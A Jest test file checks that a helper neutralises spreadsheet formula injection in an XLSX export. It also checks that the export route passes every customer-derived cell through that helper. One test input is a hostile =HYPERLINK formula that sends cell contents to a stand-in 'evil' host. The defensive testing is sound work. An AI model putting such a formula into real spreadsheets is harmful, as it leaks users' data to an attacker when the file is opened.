/**
 * Formula-injection guard for the XLSX breakdown export.
 *
 * Two halves: (1) behavioral tests of safeText against formula-shaped input,
 * proving it defangs the same OWASP lead-char set csvCell() guards; (2) a
 * source-assertion pass over route.ts proving every customer/org-derived text
 * cell is actually routed through safeText (dashboard jest is node-only and
 * route.ts imports next/headers + exceljs, so the wiring is asserted as text —
 * same idiom as route-csv-contract.test.ts).
 */
import { readFileSync } from 'fs'
import { join } from 'path'
import { safeText } from '../xlsx-cell'
import { csvCell } from '../../journal/csv'

describe('safeText — spreadsheet formula-injection guard', () => {
  it('defangs a stored =HYPERLINK signal name so it can not run on open', () => {
    expect(safeText('=HYPERLINK("http://evil/?leak="&A1,"x")')).toBe(
      '\'=HYPERLINK("http://evil/?leak="&A1,"x")'
    )
  })

  it('prefixes every OWASP lead-char trigger', () => {
    for (const trigger of ['=', '+', '-', '@', '\t', '\r', '\n']) {
      expect(safeText(`${trigger}danger`)).toBe(`'${trigger}danger`)
    }
  })

  it('leaves a trigger char that is not in the lead position untouched', () => {
    expect(safeText('GPT-4')).toBe('GPT-4')
    expect(safeText('cost=1')).toBe('cost=1')
    expect(safeText('a@b')).toBe('a@b')
  })

  it('leaves an ordinary name byte-identical', () => {
    expect(safeText('Acme Corp')).toBe('Acme Corp')
    expect(safeText('Claude')).toBe('Claude')
  })

  it('treats null/undefined/empty as an empty cell', () => {
    expect(safeText(null)).toBe('')
    expect(safeText(undefined)).toBe('')
    expect(safeText('')).toBe('')
  })

  it("mirrors csvCell()'s exact lead-char set (layer-1 parity, no RFC quoting)", () => {
    // For values with no comma/quote/newline, csvCell applies only its layer-1
    // formula guard — so safeText must match it byte-for-byte on that set.
    for (const trigger of ['=', '+', '-', '@', '\t']) {
      expect(safeText(`${trigger}x`)).toBe(csvCell(`${trigger}x`))
    }
    expect(safeText('Acme Corp')).toBe(csvCell('Acme Corp'))
  })
})

describe('route.ts — every customer-derived XLSX cell is guarded', () => {
  const src = readFileSync(join(__dirname, '..', 'route.ts'), 'utf8')

  it('imports safeText from the pure xlsx-cell module', () => {
    expect(src).toMatch(
      /import\s*\{\s*safeText\s*\}\s*from\s*['"]\.\/xlsx-cell['"]/
    )
  })

  it('routes service/task/agent name, category and provider through safeText', () => {
    expect(src).toMatch(/name:\s*safeText\(row\.name\)/)
    expect(src).toMatch(/category:\s*safeText\(row\.category\)/)
    expect(src).toMatch(/context:\s*safeText\(row\.context\)/)
  })

  it('routes invoice number, customer name, plan name and method through safeText', () => {
    expect(src).toMatch(/invoiceNumber:\s*safeText\(row\.invoiceNumber\)/)
    expect(src).toMatch(/customerName:\s*safeText\(row\.customerName\)/)
    expect(src).toMatch(/planName:\s*safeText\(row\.planName\)/)
    expect(src).toMatch(/method:\s*safeText\(row\.method\s*\?\?\s*'—'\)/)
  })
})
